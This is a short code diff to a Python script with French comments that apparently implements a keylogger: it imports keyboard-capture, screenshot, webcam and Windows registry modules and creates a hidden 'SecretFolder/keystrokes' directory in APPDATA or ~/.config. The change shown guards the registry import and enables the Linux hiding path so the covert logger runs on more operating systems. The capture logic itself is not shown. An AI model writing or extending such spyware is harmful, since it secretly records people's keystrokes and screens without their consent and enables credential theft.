@@ -5,7 +5,6 @@ import subprocess
 import time
 import os
 import sys
-import shutil
 import platform
 import json
 import threading
@@ -13,16 +12,19 @@ import cv2
 import io
 import keyboard
 import pyautogui
-import winreg as reg
+if platform.system() == "Windows":
+    import winreg as reg
+else:
+    reg=None    
 
 time_interval = 10
 text = ""
 
 # Configuration de l'environnement selon l'OS
-""" if platform.system() == "Windows": """
-hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
-""" else:
-    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") """
+if platform.system() == "Windows":
+    hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
+else:
+    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") 
     
 os.makedirs(hidden_folder, exist_ok=True)  # Créer le répertoire caché s'il n'existe pas
 
